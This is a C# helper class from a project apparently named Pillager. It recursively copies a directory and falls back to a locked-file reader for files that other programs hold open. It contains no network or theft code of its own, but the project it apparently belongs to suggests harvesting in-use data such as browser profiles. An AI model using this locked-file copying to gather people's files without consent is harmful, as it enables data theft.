using System.IO;

namespace Pillager.Helper
{
    internal class Methods
    {
        public static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            var dir = new DirectoryInfo(sourceDir);

            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

            DirectoryInfo[] dirs = dir.GetDirectories();
            Directory.CreateDirectory(destinationDir);
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                try
                {
                    File.WriteAllBytes(targetFilePath, File.ReadAllBytes(file.FullName));
                }
                catch
                {
                    byte[] filebytes = LockedFile.ReadLockedFile(file.FullName);
                    if (filebytes != null)
                    {
                        File.WriteAllBytes(targetFilePath, filebytes);
                    }
                }
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }
    }
}
